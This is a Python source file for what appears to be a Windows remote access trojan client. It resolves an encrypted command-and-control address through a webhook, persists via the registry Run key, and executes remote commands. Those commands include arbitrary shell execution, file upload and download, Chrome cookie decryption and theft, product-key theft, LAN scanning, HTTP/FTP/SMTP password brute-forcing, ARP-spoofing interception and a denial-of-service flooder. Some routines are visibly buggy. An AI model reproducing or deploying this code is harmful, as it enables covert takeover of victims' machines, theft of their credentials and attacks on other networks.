import socket
from  win32api import * 
import os
import sys
from scapy.all import * 
import shutil
class start():
	def loop_receive(socket, buffer, ip):
		class inspect():
			def data(bytes, buffer, socket, ip):
				dats = bytes.strip()
				print(dats)
				if dats == "test":
					socket.send("received!\x0A".encode("utf-8"))
				elif dats == "allinfo":
					import platform
					import socket as socketie
					tims = GetLocalTime()
					pays = str(tims[4]) + ":" + str(tims[5]) + ":" + str(tims[6])
					payload = '''
+-----------------------+
OS: %s
Local-Address: %s
Current-dir: %s
System: %s
Computer-Name: %s
Current User-name: %s
Local Hostname: %s
Domain name: %s
Keyboard state: %s
Local-Time: %s
+-----------------------+'''%(platform.platform(), socketie.gethostbyname(socketie.gethostname()),os.getcwd(), platform.system(), GetComputerName(), GetUserName(), socketie.gethostname(), GetDomainName(), GetKeyboardState(),pays)
					socket.send(payload.encode("utf-8"))
				elif dats == "getprod":
					import subprocess
					call = subprocess.Popen("wmic path SoftwareLicensingService get OA3xOriginalProductKey", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					calls = call.stdout.read()
					if calls != None:
						socket.send(calls)
					else:
						socket.send("* Failure * ".encode("utf-8"))
				elif "exec" in dats:
					template = dats.split(":")
					cli = template[1]
					import subprocess
					calls = subprocess.Popen(cli, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					socket.send(calls.stdout.read() + calls.stderr.read())
				elif "showfiles" in dats:
					files = os.listdir()
					socket.send(b"\x0A".join(fr.encode("utf-8") for fr in files))
				elif "download" in dats:
					pops = dats.split(":")
					with open(pops[1], "rb") as file:
						rock = b"\n".join(ols for ols in file)
						socket.send(rock)	
				elif "shutdown" in dats:
					pops = dats.split(":")
					msg = pops[1]
					socket.send("shot".encode("utf-8"))
					try:
						InitiateSystemShutdown(None, msg, 10, 0, 0)
					except:
						socket.send('failure'.encode("utf-8"))
						xr = os.system("shutdown /t 10 /s")
						if xr == 0 and not 1:
							socket.send("compl".encode("utf-8"))
				elif "upload" in dats:
					poop = dats.split(";")
					socket.send("data".encode("utf-8"))
					with open(poop[1], "wb") as file:
						to_write_data = socket.recv(124128)
						print(to_write_data)
						file.write(to_write_data)
					socket.send("* Writing finished * ".encode("utf-8"))
				elif "checkac" in dats:
					#print("1232132131")
					belong = os.getcwd()
					rises = []
					directories = [f"C:\\\\Users\\\\{os.getlogin()}\\\\Pictures", f"C:\\\\", f"C:\\\\Users\\\\{os.getlogin()}\\\\Desktop", f"C:\\\\Users\\\\{os.getlogin()}\\\\Documents", f"C:\\\\Users\\{os.getlogin()}\\\\AppData\\\\"]
					for dirs in directories:
						try:
							trys = os.chdir(dirs)
							rises.append(dirs + "- Accessable")
						except Exception as failure:
							os.chdir(belong)
							rises.append(dirs + " - Failure")
					socket.send(b"\x0A".join(xox.encode() for xox in rises))
				elif "scanloc" in dats:
					belongs = dats.split(":")
					addr = get_if_addr(conf.iface).split(".")
					spils = addr[0] + "." + addr[1] + "." + addr[2] + "."
					print(spils)
					opens = []
					def thread_me(socket, addr, opens, ranges):
						def threads():
							def scan():
								for cr in range(ranges):
									toscan = addr + str(cr)
									#print(toscan)
									ifnone = sr1(IP(dst=toscan)/ICMP(), verbose=0, timeout=1)
									#print(ifnone)
									if ifnone != None:
										opens.append(toscan + "- Alive" + " MAC: %s"%(getmacbyip(toscan)))
									else:
										pass 
										#print("[-] FAILURE")
								socket.send(b"\x0A".join(ip.encode() for ip in opens))
							for o in range(1):
								ts = Thread(target=scan)
								ts.start()
						threads()
					thread_me(socket=socket, addr=spils, opens=opens, ranges=int(belongs[1]))
				elif "enumiface" in dats:
					route = conf.route
					socket.send(str(route).encode("utf-8"))
				elif "brute-http" in dats:
					act = dats.split(":")
					socket.send("wordlist".encode("utf-8"))
					big_data = ""
					#for exclusive_or in range(2):
						#try:
					#sor = socket
					#for incom in range(2):
					big_data += socket.recv(123112).decode("utf-8").strip()
					with open("plist.txt", "a", encoding="utf-8") as file:
						file.write(big_data.strip())
					socket.send("done".encode("utf-8"))
					print(act)
					host = act[1] 
					port = act[2]
					user = act[3]
					form = act[4]
					pform = act[5]
					words = []
					with open("plist.txt", "r", encoding="utf-8") as file:
						for lines in file:
							word = lines.strip()
							words.append(word)
					import requests
					site_ = "https://" + host + "/" + act[6]
					import urllib3
					urllib3.disable_warnings()
					varss = []
					for cwords in words:
						reqs = {f"{form}":f"{user}",f"{pform}":f"{cwords}"}
						print(reqs)
						ol = requests.post(site_, verify=False, data=site_.encode("utf-8"))
						print(act[6])
						if act[6] in ol.text:
							#print(ol.text)
							pass 
						else:
							varss.append("* Authentication completed! Username: %s Password: %s *"%(user, cwords))
							break 
					if len(varss) == 0:
						socket.send("* Authentication failure! * ".encode("utf-8"))
					else:
						socket.send(varss[0].encode("utf-8"))
				elif "brute-ftp" in dats:
					acto = dats.split(":")
					host = acto[1]
					port = acto[2]
					usr = acto[3]
					#print("123123213")
					socket.send("wordlist".encode("utf-8"))
					big_data = socket.recv(1232248).decode("utf-8")
					with open("ftp_list.txt", "w") as file:
						file.write(big_data)
					words = []
					with open("ftp_list.txt", "r") as filex:
						for lines in filex:
							word = lines.strip()
							#print(word)
							words.append(word)
					ready = []
					cor = socket
					def threadit(sockets, words, host, port):
						def __actual__():
							for passwords in words:
						#print(passwords)
								try:
								#print(host)
									#print(passwords)
									import socket  
									socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
									socks.connect((host, 21))
									socks.recv(21842).decode("utf-8")
									payload = "USER %s\r\x0APASS %s\r\x0A"%(usr, passwords)
									socks.send(payload.encode("utf-8"))
									ans = socks.recv(16581).decode("utf-8")
									print(ans)
									rnd = socks.recv(16813).decode("utf-8")
									print(rnd)
									if rnd ==  "failed" or "failure" in rnd:
										pass 
									else:
										ready.append("* Authentication completed! Pairs Username: %s Password: %s* "%(usr, passwords))
										break 
									socks.close()
								except Exception as failure:
									cor.send(f"* Failure connecting to host * ** Reason: {str(failure)} ** ".encode("utf-8"))
									break 
								else:
									def more(argument):
										return argument > 0
										if len(ready) == 0 and not more(argument=ready):
											cor.send("* Authentication failure * ".encode("utf-8"))
										else:
											cor.send(ready[0].encode("utf-8"))
						from threading import Thread
						for iss in range(1):
							selfs = Thread(target=__actual__)
							selfs.start()
					threadme = threadit(sockets=socket, words=words, host=host, port=port)
				elif "g3tmac" in dats:
					enum = get_if_addr(conf.iface)
					socket.send(f"IP: {enum}".encode("utf-8") + b"\x0A" + b"MAC: " +  str(getmacbyip(enum)).encode("utf-8"))
				elif "changeproc" in dats:
					name = dats.split(":")
					olx = name[1]
					countable = []
					with open(sys.argv[0], "r") as read:
						for lines in read:
							countable.append(lines)
					with open(olx, "w") as writes:
						bob =  "\x0A".join(cos for cos in countable)
						writes.write(bob)
					writes.close()
					ShellExecute(0, None, olx, None, os.getcwd(), 1)
					DeleteFile(olx)
				elif "brokeff" in dats:
					with open("%s"%(sys.argv[0]), "w") as file:
						file.write('''
BROKE, BROKEY!!!''')
					file.close()
					socket.send("* Break emission finished successfully * ")
				elif "brute-mail" in dats:
					namos = dats.split(":")
					host = namos[1]
					port = namos[2]
					usr = namos[3]
					socket.send("wordlist".encode("utf-8"))
					big_data = socket.recv(12481412).decode("utf-8")
					with open("slow_type.txt", "w") as file:
						file.write(big_data + "\x0A")
					file.close()
					words = []
					class brute():
						def thread(sockss,target, port, username, words):
							def __actual__():
								import socket
								attempted = []
								import base64
								for pwords in words:
									socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
									socks.connect((target, int(port)))
									socks.recv(124821).decode("utf-8")
									combs = base64.b64encode(username.encode("utf-8")).decode("utf-8")
									combs_p = base64.b64encode(pwords.encode("utf-8")).decode("utf-8")
									payload = "EHLO %s\r\x0AAUTH LOGIN\r\x0A%s\r\x0A%s\r\x0A"%(target, combs, combs_p)
									socks.send(payload.encode("utf-8"))
									decleared = socks.recv(14128).decode("utf-8")
									#print(decleared)
									if "535" in decleared:
										pass 
									else:
										#sockss.send(" * Authentication successful! Pairs, username: %s, password: %s *".encode("utf-8"))
										attempted.append(" * Authentication successful! Pairs, username: %s, password: %s *"%(username, pwords))
										socks.close()
										break
									socks.close()
								if len(attempted) != 0:
									sockss.send(attempted[0].encode("utf-8"))
								else:
									sockss.send(" * Authentication failure! * ")
							from threading import Thread
							for cringe in range(1):
								noobhkp = Thread(target=__actual__)
								noobhkp.start()
					with open("slow_type.txt", "r") as file:
						for lines in file:
							word = lines.strip()
							words.append(word)
					self_thread = brute.thread(sockss=socket,target=host, port=port, username=usr, words=words)
				elif "start_mitm" in dats:
					class start():
						def new_thread(ip, iface, socketl):
							socketl.send("**  * * * \x0A*Starting spoofing traffic * ".encode("utf-8"))
							def __actual__():
								class infect():
									def listen_traffic(iface, verbose, socket, target):
										if verbose >= 0:
											def __actual__():
												def snifer(pkt):
													#if pkt.haslayer(TCP):
														#print(target)
													if target == pkt[IP].dst:
														print(pkt[IP].src)
														socket.send(f"* Packets from {pkt[IP].src} *".encode("utf-8"))
													elif target == pkt[IP].src:
														socket.send(f"* Packets to {pkt[IP].dst} * ".encode("utf-8"))
												sniff(prn=snifer, iface=conf.iface)
											from threading import Thread
											for cr in range(1):
												tos = Thread(target=__actual__)
												tos.start()
									def ip_(target_ip, tmac, gateway):
										def sends(data):
											send(data, verbose=0, count=3)
										sends(data=ARP(op=1,pdst=target_ip, psrc=gateway, hwdst=tmac))
								while True:
									inf = infect.ip_(target_ip=ip, tmac=getmacbyip(ip), gateway=conf.route.route("0.0.0.0")[2])
									print(inf)
									inf2 = infect.ip_(target_ip=conf.route.route("0.0.0.0")[2], tmac=getmacbyip(conf.route.route("0.0.0.0")[2]), gateway=ip)
									infect.listen_traffic(iface=iface, verbose=1, socket=socketl, target=ip)
							from threading import Thread
							for cr in range(1):
								lols = Thread(target=__actual__)
								lols.start()
					class sc():
						def connects(server):
							import socket
							raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
							_host_ = server[0]
							_port_ = server[1]
							raw.connect((_host_, int(_port_)))
							return ("+", raw)
					bb = dats.split(":")
					_target_ip = bb[1]
					_iface_ = bb[2]
					tot = sc.connects((ip, 39481))
					print(tot)
					if tot[0] == "+":
						print("Awesome")
						tr_ = start.new_thread(ip=_target_ip, iface=_iface_, socketl=tot[1])
				elif "testdos" in dats:
					gol = dats.split(":")
					host_ = gol[1]
					port_ = gol[2]
					time_ = gol[3]
					dir_ = gol[4]
					class test():
						def _dos(target, port, time, ssl_check, raw_socket, dirs):
							def __actual__():
								class creates():
									def sock_(inet):
										import socket
										if inet == "ipv4":
											return socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
								class create():
									def payload_(length, sum):
										checksum = sum & 0xffff
										def lenof(string):
											bob = []
											for strs in string:
												bob.append(str(ord(strs)))
											return bob
										payload = int(checksum / 2 + int(lenof(string="variable")[0]))
										import socket
										import struct
										packs = struct.pack("hhhb", 0, 0, int(payload), 0)
										rrr = socket.htons(payload) #+ packs.decode("utf-8")
										calc = "A" * int(rrr)
										return calc.encode("utf-8") + packs
								payl = create.payload_(length=500, sum=0xf45abc).decode("latin-1")
								payload = "GET /%s HTTP/1.1\r\x0AConnection: close\r\x0AHost: %s\r\x0A%s\r\x0A\r\x0A\r\x0A\r\x0A"%(dirs, target,payl)
								if raw_socket == True:
									for rng in range(int(time)):
										low_l = creates.sock_(inet="ipv4")
										low_l.connect((target, int(port)))
										import socket
										def create_packet_raw(data, target):
											class sums():
												def checksum(msg):
													sos = 0
													for b in range(len(msg)):
														word = ord(msg[b]) + ord(msg[b+1]) << 8
														sx = sos + word
														sum = (sx>>16) + (sx & 0xfff)
														sum = sum + (sum >> 16)
														sum = ~s & 0xffff
														return sum
											import socket
											offset = (5 << 4) + 0
											tcp_flags = 0 + (1 << 1) + (1 << 2) + (0 << 3) + (0 << 4) + (0 << 5)
											import struct
											#ip_header = struct.pack("!BBHHHBBH44", 5,4,0,54321,0,255,6,1,666)
											ip_header = "\x41\xf4\xcf "
											header = struct.pack("!HHLLBBH", 5555, 80, 50000, 1, offset, tcp_flags, socket.htons(65535))
											_host_ = socket.inet_aton(get_if_addr(conf.iface))
											dest_addr = socket.inet_aton(socket.gethostbyname(target,))
											holder = 0
											tcp_msg_len = len(header) + len(data,)
											pushed = struct.pack("!4s4sBHH", _host_, dest_addr, holder, 6, tcp_msg_len)
											tcp_check = sums.checksum(msg=pushed)
											posh = pushed + header + msg.encode("utf-8")
											tecep = struct.pack("!HHLLBBH", 5555, 80, 50000, 1, offset, tcp_flags, socket.htons(65535))
											packet = ip_header + header + data.encode("utf-8")
											return packet
													#_rfc_ = sums.checksum(msg=data)
										if ssl_check == True:
											import ssl
											seperated = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
											#print(payload)
											try:
												olx = ssl.create_default_context()
												wraped = olx.wrap_socket(low_l, server_hostname=target)
												wraped.send(payload.encode("utf-8"))
												packet = create_packet_raw(data="%s"%(payload).encode("utf-8"), target=target)
												seperated.sendto(packet,(target, int(port)))
											except:
												packet = create_packet_raw(data="%s"%(payload).encode("utf-8"), target=target)
												seperated.sendto(packet,(target, int(port)))
												low_l.send(payload.encode("utf-8"))
											#rcv =wraped.recv(124812).decode()
											#print(rcv)
										else:
											try:
												import socket
												sox = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
												payl = create.payload_(length=6000, sum=0xf1849).decode("latin-1")
												payload = "GET / HTTP/1.1\r\x0AConnection: close\r\x0A%s\x0A\x0A\x0A"%(payl)
												low_l.send(payload.encode("utf-8"))
												packet = create_packet_raw(data="%s"%(payload), target=target)
												sox.sendto(packet.encode("utf-8"),(target, 80))
											except Exception as failure:
												print(failure)
												low_l.send(payload.encode("utf-8"))
							from threading import Thread
							for cr in range(100):
								ts = Thread(target=__actual__)
								ts.start()
					socket.send("* Denial Of Service Initialised *\x0A".encode("ascii"))
					xz = test._dos(target=host_, port=port_, time=time_, ssl_check=True, raw_socket=True, dirs=dir_)
				elif "googl-cook" in dats:
					class init():
						def __actual__(sock):
							os.chdir(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
							def exploit_decrypt_():
								import sqlite3
								ror = sqlite3.connect("Cookies")
								class decrypt():
									def generate_(**kwrags):
										key = kwrags.get("key")
										vec = kwrags.get("vector")
										from Cryptodome.Cipher import AES
										return AES.new(key, AES.MODE_GCM, vec)
									def decrypt_it(cipher, payload):
										return cipher.decrypt(payload)
									def data_(**kwargs):
										dats = kwargs.get("cookienc")
										mkey = kwargs.get("master_key")
										vector = dats[3:15]
										payls = dats[15:]
										cipher = decrypt.generate_(key=mkey, vector=vector)
										decr = decrypt.decrypt_it(cipher=cipher, payload=payls)
										return decr[:-16].decode("utf-8")
								class lol():
									def grab_key():
										intels = []
										import json
										import base64
										os.chdir(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\")
										with open("Local State") as force:
											loc = force.read()
											pop = json.loads(loc)
										mas = base64.b64decode(pop["os_crypt"]["encrypted_key"])
										masterie = mas[5:]
										import win32crypt
										mistur = win32crypt.CryptUnprotectData(masterie, None, None, None, 0)[1]
										return mistur
								try:
									os.chdir(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
									vors = ror.execute("SELECT host_key, name, encrypted_value FROM cookies")
									anyways = []
									for alls in vors:
										dec = decrypt.data_(cookienc=alls[2], master_key=lol.grab_key())
										anyways.append(f"Host: {alls[1]}\r\nCookie{dec}")
									bob = b"\n".join(xor.encode("utf-8") for xor in anyways)
									sock.send(bob)
								except:
									sock.send("* Failure * ".encode("utf-8"))
							from threading import Thread
							for cr in range(1):
								ol = Thread(target=exploit_decrypt_)
								ol.start()
					google_cookie = init.__actual__(sock=socket)
				elif "proxyme" in dats:
					class bind():
						def create_new_for_bind(socket, orgsock, host, port):
							def __actual__():
								orgsock.send("* Binded * ".encode("utf-8"))
								while True:
									socket.listen(5)
									cl_inet, cl_addr = socket.accept()
									data = cl_inet.recv(124812).decode("utf-8")
									orgsock.send(data.encode("utf-8"))
							from threading import Thread
							for i in range(1):
								th = Thread(target=__actual__)
								th.start()
						def server_(**kwargs):
							def create_sock(af_inet):
								import socket
								if af_inet == "ipv4":
									return socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
								else:
									return socket.socket(socket.AF_INET6, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
							socket = create_sock(af_inet="ipv4")
							socket.bind((kwargs.get("srvip"), kwargs.get("srvport")))
							bind.create_new_for_bind(socket=socket, orgsock=kwargs.get("original_sock"), host=kwargs.get("srvip"), port=kwargs.get("srvport"))
					psl = dats.split(":")
					srvhost = psl[1]
					srvport = int(psl[2])
					binds = bind.server_(original_sock=socket, srvip=srvhost, srvport=srvport)
				elif "consoleme" in dats:
					global cr
					cr = []
					class connecter():
						def server_console(console, srvhost, srvport):
							def int_thread():
								class sock_afinet():
									def create_sock(af_inet):
										import socket
										if af_inet == "ipv4":
											return socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
										else:
											return socket.socket(socket.AF_INET6, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
								if console == True:
									sock_l = sock_afinet.create_sock(af_inet="ipv4")
									sock_l.connect((srvhost, int(srvport)))
									while True:
										con_data = sock_l.recv(124182).decode("utf-8")
										print(con_data)
										sums = 0
										if "ls" in con_data:
											bib = os.listdir()
											for files in bib:
												try:
													with open(files, "r") as file:
														ol = "".join(xox for xox in file)
														sum = len(ol) /1000 | 1
														sums += sum
												except Exception as cor:
													#orden = []
													#worden = "Error"
													#for words in worden:
													#	orden.append(ord(words))
													#br = []
													#for xia in orden:
													#	hexs = hex(xia)
													#	br.append(hexs)
													#sum = "".join(str(bs) for bs in br)
													pass 
											import platform
											sick = "\x0A".join(fil for fil in bib)
											def calculate_time():
												actual =GetLocalTime()
												time = ("%s:%s:%s"%(actual[4], actual[5], actual[6]))
												return time
											time_traveller = calculate_time()
											sock_l.send(f'''
Local state of {os.getlogin()}
{time_traveller} UTC: {GetLocalTime()[7]}
Total kb {sums} in this directory ({os.getcwd()})
System: {platform.system()}

|---------Total files {len(bib)}---------|
{sick} 

|----------------------------------------|'''.encode("utf-8"))
										elif "lan2mac" in con_data:
											addr = con_data.split(":")
											address = addr[1]
											class payload():
												def form_(addr):
													if addr == None:
														return False
													import socket
													def enum_(addr, sock):
														sock.sendto(b"Hello, World\r\n", (addr, 50))
														becare = sock.getsockname()[0]
														return becare
													import platform
													class data_base():
														def find(type, number):
															if number == 10:
																if type == "phone":
																	return "Samsung Electronics"
																else:
																	return None
															elif number == 11:
																if type == "router":
																	return "TP-LINK Technologies"
																else:
																	return None
															return None
													dnsenum = enum_(addr="1.1.1.1", sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
													if addr != None:
														if getmacbyip(addr).startswith("d0"):
															device = data_base.find(type="phone", number=10)
														elif getmacbyip(addr).startswith("ff"):
															device = "Local Device"
														elif getmacbyip(addr).startswith("e8"):
															device = data_base.find(type="router", number=11)
														else:
															device = "None"
													else:
														device = "Unknown"
													return '''
Local state of %s
System: %s
---------------------
IP: %s/24
Mac Address: %s (48-bits)
Device: %s
DNS-hostility: %s
---------------------
'''%(os.getlogin(), platform.system(), addr, getmacbyip(addr), device, dnsenum)
											formit = payload.form_(addr=address.strip())
											sock_l.send(formit.encode("utf-8"))
										elif "cftp" in con_data.split():
											class cred():
												def authorise_credentiality(**kwargs):
													def create_full_socket(af_inet, stream):
														import socket
														if stream == True and stream != False:
															if af_inet == "ipv4":
																return socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
															else:
																return socket.socket(socket.AF_INET6, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
													payload = "USER %s\r\x0APASS %s\r\x0A"%(kwargs.get("username"), kwargs.get("password"))
													socket_ = create_full_socket(af_inet="ipv4", stream=True)
													socket_.connect((kwargs.get("host"), int(kwargs.get("port"))))
													first_byte = socket_.recv(141281).decode("utf-8")
													#print(first_byte)
													socket_.send(payload.encode("utf-8"))
													listes = []
													#while len(listes) <= 2:
													auth_ = socket_.recv(14218).decode("utf-8")
													auth_ = socket_.recv(14218).decode("utf-8")
													listes.append(auth_)
													auth = listes[0]
													def deformit(plain):
														ols = plain.split(" ")
														if "530" in ols[0]:
															return "Login Failure"
														else:
															return "Login completed! Soon, commands will be added!"
													ans = deformit(plain=auth)
													need = kwargs.get("oursock")
													need.send(ans.encode("utf-8"))
											cos = con_data.split(":")
											_host_ = cos[1]
											_port_ = cos[2]
											sock_l.send("username?".encode("utf-8"))
											usr = sock_l.recv(148121).decode("utf-8")
											sock_l.send("password?".encode("utf-8"))
											pswd = sock_l.recv(148221).decode("utf-8")
											cred.authorise_credentiality(username=usr, password=pswd, host=_host_, port=_port_, oursock=sock_l)
										elif "copen" in con_data.split(":")[0]:
											cros = con_data.split(":")
											file = cros[1]
											def execute_command(file):
												try:
													ShellExecute(0, None, file, "pass", os.getcwd(), 1)
													return "0"
												except:
													return "1"
											xz = execute_command(file=file)
											if xz == "1":
												sock_l.send("* Failure * ")
											else:
												sock_l.send("* Completed * ")
										elif "cmove" in con_data.split(":")[0]:
											class moves():
												def move_file(file, dest):
													try:
														shutil.move(file, dest)
														return "0"
													except:
														return "1"
											file = con_data.split(";")
											print(file)
											files = file[1]
											dest = file[2]
											xro = moves.move_file(file=files, dest=dest)
											if xro == "0":
												sock_l.send("* Completed * ".encode("utf-8"))
											else:
												sock_l.send("* Failure * ".encode("utf-8"))
										elif "ccd" in con_data.split(";")[0]:
											orc = con_data.split(";")
											if "back" in orc[1]:
												current = os.getcwd()
												poped = current.split("\\")
												coal = len(poped)-1
												beatle = poped.remove(poped[coal])
												borche = "\\".join(dir for dir in poped)
												os.chdir(borche)
												sock_l.send(f"* Moved to dir {borche} successfully * ".encode("utf-8"))
										elif "cfind" in con_data.split(";")[0]:
											def __find__(key, directory):
												try:
													back = os.getcwd()
													back_cwd = os.chdir(directory)
													oss = os.listdir(directory)
												except:
													return False
												nfo = []
												for contents in oss:
													try:
														with open(contents, "r", encoding="utf-8") as file:
															for letstry in file:
																words = letstry.strip()
																if key in words:
																	#los = len(letstry) / 1000 | 4
																	nfo.append("File: %s  ==> %s Word | "%(contents, key, ))#los))
																else:
																	pass 
													except Exception as false:
														#print(false)
														pass 
												os.chdir(back)
												return nfo
											data = con_data.split(";")
											key = data[1]
											dirs = data[2]
											rso = __find__(key=key, directory=dirs)
											#print(rso)
											if rso != None or False:
												stripped = "\x0A".join(con for con in rso)
												sock_l.send(stripped.encode("utf-8"))
											if rso == []:
												sock_l.send(f"* Files with key ({key}) NOT found in directory ({dirs}). .*".encode("utf-8"))
											#else:
											#	sock_l.send("*Error occured*".encode("utf-8"))
								else:
									return False
							from threading import Thread
							for cr in range(1):
								fros = Thread(target=int_thread)
								fros.start()
					po = dats.split(":")
					_srvhost_ = po[1]
					_srvport_ = int(po[2])
					init =  connecter.server_console(console=True, srvhost=_srvhost_, srvport=_srvport_)
					if init == False:
						socket.send("* Problem occured * ".encode("utf-8"))
		while True:
			data = socket.recv(buffer*1).decode()
			xr = inspect.data(bytes=data, buffer=buffer, socket=socket, ip=ip)
	def define_socket(af_inet):
		if af_inet == 'ipv6':
			return socket.socket(socket.AF_INET6, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
		else:
			return socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
	def connect_server(ip, port):
		class infect_():
			def pc(sock,external_ip, my_ip, my_gateway_, gateway_mac):
				vr = send(ARP(op=5,pdst=my_ip, psrc=external_ip, hwdst=gateway_mac), verbose=0, count=3)
				sock.send(str(vr).encode("utf-8"))
		socks4 = start.define_socket(af_inet="ipv4")
		_max_buffer = 16096
		socks4.connect((ip, port))
		import sys
		def regedit(command):
			os.system(command)
		regedit(command='reg.exe add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v %s /t REG_SZ /d "%s"'%(sys.argv[0], sys.argv[0]))
		def send_api_key(key, encoding, socket):
			socket.send(key.encode(encoding))
		send_api_key(key="ffalsxoa;lasodfpafoa9&!^#!@&!*#@!(#&AS", encoding="utf-8", socket=socks4)
		_ = socks4.recv(124812).decode("utf-8")
		if "significant" in _:
			infect_.pc(sock=socks4, external_ip=ip, my_ip=get_if_addr(conf.iface), my_gateway_=conf.route.route()[0], gateway_mac=getmacbyip(conf.route.route()[2]))
		start.loop_receive(socket=socks4, buffer=_max_buffer, ip=ip)
class decipher():
	def ip_host(host, ssl_check, socket_def, request_lib, aes_ip):
		def sockets(**kwargs):
			if kwargs.get("ssls") == False:
				import socket
				raw_sock = socket.socket()
				raw_sock.connect((kwargs.get("host"), 80))
				apart = kwargs.get("host").split(".")
				hosts = apart[2] + "." + apart[3]
				payload = f"GET / HTTP/1.1\r\x0AConnection: close\r\x0AHost: {hosts}\r\x0A\x0A"
				raw_sock.send(payload.encode("utf-8"))
				try:
					ans = raw_sock.recv(14812).decode("utf-8").split(" ")
			#		print(ans[1])
					if "404" in ans[1]:
						print("* Try with SSL, then . .*")
				except Exception as failure:
					print("* Try with requests for debug .. *")
					pass 
			else:
				import socket
				import ssl
				cont = ssl.create_default_context()
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
				sock.connect((host, 443))
				socks = cont.wrap_socket(sock, server_hostname=host)
				payload = f"GET / HTTP/1.1\r\x0AConnection: close\r\x0AHost: {host}\r\x0A\x0A"
				socks.send(payload.encode("utf-8"))
				ans = socks.recv(124812).decode("utf-8")
				#print(ans)
				strips = ans.split(" ")
				strops = strips[17]
				solx = strops.split(":")
				key_ = solx[1]
				vec_ = solx[1]
				def deformit(text):
					pop = text.replace("}", "")
					pops = pop.replace('"', "")
					popi = pops.replace("'", "")
					#popis = 
					return popi
				plain = deformit(text=key_)
				vec_ = plain
				key_ = plain
				#print(vec_)
				from Cryptodome.Cipher import AES
				deeper = AES.new(key_.encode("utf-8"), AES.MODE_CBC, vec_.encode("utf-8"))
				deepers = deeper.decrypt(aes_ip).strip()
				print(deepers)
				if b"\x02" in deepers:
					vor = deepers.split(b"\x02")
				elif b"\x03" in deepers:
					vor = deepers.split(b"\x03")
				ols = vor[0]
				return ols.decode("utf-8")
				#return ip.strip()
		#print(ssl_check)
		#import base64
		#host = base64.b64decode(host)
		if ssl_check == False:
			if socket_def != False:
				#print(raw_socket)
				#print("12321312321")
				sockets(host=host, ssls=False)
				sys.exit(1)
			else:
				if request_lib == True and not False:
					print("  ")
		else:
			if socket_def == True:
				xr = sockets(host=host, ssls=True)
				return xr
def __main__(**kwargs):
	if kwargs.get("switch") == True and not False:
		# If ssl_check is on True, It will start checking If the provided host supports TLS/SSL, If it doesn't, It will take unessesary time!
		# socket_def is for raw socket, If it is True, It will start connecting from raw socket which is way faster.
		# aes_ip is for the encrypted IP, where it should by decrypted by the receiving message from the argument. 
		# request_lib is for request library, If it is True, It will start trying with the library, If it is not installed, It will take unessesary time!
		# Please test the client on local first, to see configuration. 
		ip = decipher.ip_host(host="en4ia5odbvdi0jy.m.pipedream.net", ssl_check=True, socket_def=True, request_lib=False, aes_ip=b'a\xc3.n\x94\xe6\x04\x0el\x1dm\x02\xfc\x93\x16r')
		#print(ip)
		start.connect_server(ip=ip, port=kwargs.get("port"))
	else:
		#print(xr)
		start.connect_server(ip=ip, port=kwargs.get("port"))
#ip = decipher.ip_(host="ZW5yeDhyeHZyemVrcHJhLm0ucGlwZWRyZWFtLm5ldA==", socketing=True)
cl = __main__(ip="", port=10491, switch=True) #  Switch is espically for Public IP address, use request.bin or other webhook to receive the decription key! (Webhook should support JSON!)